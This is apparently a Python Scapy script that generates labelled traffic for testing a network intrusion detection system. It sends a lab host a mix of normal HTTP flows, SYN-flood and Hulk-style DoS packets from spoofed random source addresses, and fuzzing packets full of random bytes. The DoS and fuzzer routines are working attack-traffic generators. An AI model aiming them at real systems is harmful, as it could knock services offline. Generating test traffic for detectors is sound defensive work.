import time
import random
from scapy.all import IP, TCP, send, Raw, RandIP, RandShort

TARGET_IP = "192.168.1.2"      # Your receiver / victim
TARGET_PORT = 80               # Common for HTTP (DoS + Fuzzers)
INTERFACE = None               # None = default route

# =================================================================
# 1. Normal Flow (Realistic HTTP session)
# =================================================================
def make_normal_flow():
    src_port = random.randint(20000, 60000)
    payload = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"

    syn = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=TARGET_PORT, flags="S", seq=1000)
    data = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=TARGET_PORT, flags="PA", seq=1001, ack=1)/Raw(payload)
    fin = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=TARGET_PORT, flags="FA", seq=1001+len(payload))

    return [syn, data, fin], "normal"

# =================================================================
# 2. DoS Attack (UNSW-NB15 style: HTTP DoS + SYN Flood mix)
# =================================================================
def make_dos_attack():
    packets = []
    src_port = 6666

    # 50–150 rapid packets: some SYN, some with huge payload (like Slowloris + Hulk)
    for i in range(random.randint(60, 120)):
        if random.random() < 0.4:
            # Pure SYN (classic SYN flood)
            p = IP(dst=TARGET_IP, src=RandIP())/TCP(sport=RandShort(), dport=TARGET_PORT, flags="S")
        else:
            # Large/fake HTTP requests (Hulk-style DoS)
            fake_url = random.choice([b"/admin.php", b"/login", b"/?id=999999", b"/search?q=" + b"A"*200])
            payload = b"GET " + fake_url + b" HTTP/1.1\r\nUser-Agent: Mozilla\r\n\r\n"
            p = IP(dst=TARGET_IP)/TCP(sport=src_port, dport=TARGET_PORT, flags="PA", seq=i*1000)/Raw(payload)

        packets.append(p)

    return packets, "DoS"

# =================================================================
# 3. Fuzzers Attack (Malformed/random data to crash services)
# =================================================================
def make_fuzzers_attack():
    packets = []
    src_port = 31337

    for i in range(random.randint(15, 40)):
        # Totally random garbage payload + weird flags
        garbage = random.randbytes(random.randint(50, 2000))
        weird_flags = random.choice(["S", "F", "R", "P", "PA", "FA", "SA", "RA", "U"])

        p = IP(dst=TARGET_IP)/TCP(
            sport=src_port,
            dport=random.choice([TARGET_PORT, 22, 21, 3306, 445, 3389]),  # random service port
            flags=weird_flags,
            seq=random.randint(1, 999999),
            ack=random.randint(1, 999999)
        )/Raw(garbage)

        packets.append(p)
        time.sleep(0.02)  # fast but not too fast

    return packets, "Fuzzers"

# =================================================================
# Main Generator: 80% Normal | 10% DoS | 10% Fuzzers
# =================================================================
def generate_traffic(total_flows=100):
    print(f"Starting UNSW-NB15 traffic generation → {TARGET_IP}:{TARGET_PORT}")
    print("Traffic mix: 80% Normal | 10% DoS | 10% Fuzzers\n")

    for i in range(1, total_flows + 1):
        r = random.random()

        if r < 0.10:              # 10% → DoS
            pkts, label = make_dos_attack()
            print(f"[{i}] Sending DoS attack ({len(pkts)} packets)")
        elif r < 0.20:            # 10% → Fuzzers
            pkts, label = make_fuzzers_attack()
            print(f"[{i}] Sending Fuzzers attack ({len(pkts)} packets)")
        else:                     # 80% → Normal
            pkts, label = make_normal_flow()
            if i % 15 == 0:       # reduce log spam
                print(f"[{i}] normal flow")

        # Send all packets
        for p in pkts:
            send(p, iface=INTERFACE, verbose=False)
            time.sleep(0.03 if label == "normal" else 0.005)

        # Delay before next flow
        time.sleep(random.uniform(0.5, 3.0) if label == "normal" else 0.1)

    print("\nFinished! Check your NIDS → you should see ~10 DoS + ~10 Fuzzers alerts")

# =================================================================
if __name__ == "__main__":
    random.seed(123)  # reproducible
    generate_traffic(total_flows=150)   # generates ~30 attacks